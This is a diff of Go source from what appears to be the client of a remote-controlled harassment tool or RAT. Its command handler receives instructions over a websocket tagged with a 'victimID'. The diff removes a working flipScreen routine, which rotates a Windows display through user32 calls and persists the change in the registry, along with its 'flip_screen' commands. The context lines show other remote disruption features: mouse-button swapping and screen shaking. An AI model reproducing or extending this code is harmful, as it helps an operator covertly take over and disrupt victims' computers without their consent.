@@ -119,86 +119,6 @@ func swapMouseButtons(swapLeftRight bool) {
 	}
 }
 
-func flipScreen(orientation int) {
-	if runtime.GOOS != "windows" {
-		return
-	}
-
-	user32 := syscall.NewLazyDLL(getUser32DLL())
-	procChangeDisplaySettings := user32.NewProc("ChangeDisplaySettingsExW")
-	procEnumDisplaySettings := user32.NewProc("EnumDisplaySettingsW")
-
-	type DEVMODE struct {
-		dmDeviceName       [32]uint16
-		dmSpecVersion      uint16
-		dmDriverVersion    uint16
-		dmSize             uint16
-		dmDriverExtra      uint16
-		dmFields           uint32
-		dmPositionX        int32
-		dmPositionY        int32
-		dmDisplayOrientation uint32
-		dmDisplayFixedOutput uint32
-		dmColor            int16
-		dmDuplex           int16
-		dmYResolution      int16
-		dmTTOption         int16
-		dmCollate          int16
-		dmFormName         [32]uint16
-		dmLogPixels        uint16
-		dmBitsPerPel       uint32
-		dmPelsWidth        uint32
-		dmPelsHeight       uint32
-		dmDisplayFlags     uint32
-		dmDisplayFrequency uint32
-		dmICMMethod        uint32
-		dmICMIntent        uint32
-		dmMediaType        uint32
-		dmDitherType       uint32
-		dmReserved1        uint32
-		dmReserved2        uint32
-		dmPanningWidth     uint32
-		dmPanningHeight    uint32
-	}
-
-	var dm DEVMODE
-	dm.dmSize = uint16(unsafe.Sizeof(dm))
-
-	ret, _, _ := procEnumDisplaySettings.Call(0, 0xFFFFFFFF, uintptr(unsafe.Pointer(&dm)))
-	if ret == 0 {
-		return
-	}
-
-	const DMDO_DEFAULT = 0
-	const DMDO_90 = 1
-	const DMDO_180 = 2
-	const DMDO_270 = 3
-	const DM_DISPLAYORIENTATION = 0x00000080
-
-	dm.dmFields = DM_DISPLAYORIENTATION
-
-	switch orientation {
-	case 0:
-		dm.dmDisplayOrientation = DMDO_DEFAULT
-	case 1:
-		dm.dmDisplayOrientation = DMDO_90
-	case 2:
-		dm.dmDisplayOrientation = DMDO_180
-	case 3:
-		dm.dmDisplayOrientation = DMDO_270
-	default:
-		dm.dmDisplayOrientation = DMDO_DEFAULT
-	}
-
-	const CDS_UPDATEREGISTRY = 0x00000001
-	const CDS_NORESET = 0x10000000
-
-	_, _, _ = procChangeDisplaySettings.Call(
-		uintptr(unsafe.Pointer(&dm)),
-		uintptr(CDS_UPDATEREGISTRY|CDS_NORESET),
-	)
-}
-
 func startShakeScreen() {
 	if runtime.GOOS != "windows" {
 		return
@@ -325,26 +245,6 @@ func handleServerCommand(conn *websocket.Conn, victimID, command string) {
 
 	if lower == strings.ToLower(getShakeOffCmd()) {
 		stopShakeScreen()
-		return
-	}
-
-	if lower == "flip_screen_0" {
-		go flipScreen(0)
-		return
-	}
-
-	if lower == "flip_screen_90" {
-		go flipScreen(1)
-		return
-	}
-
-	if lower == "flip_screen_180" {
-		go flipScreen(2)
-		return
-	}
-
-	if lower == "flip_screen_270" {
-		go flipScreen(3)
 		return
 	}
 
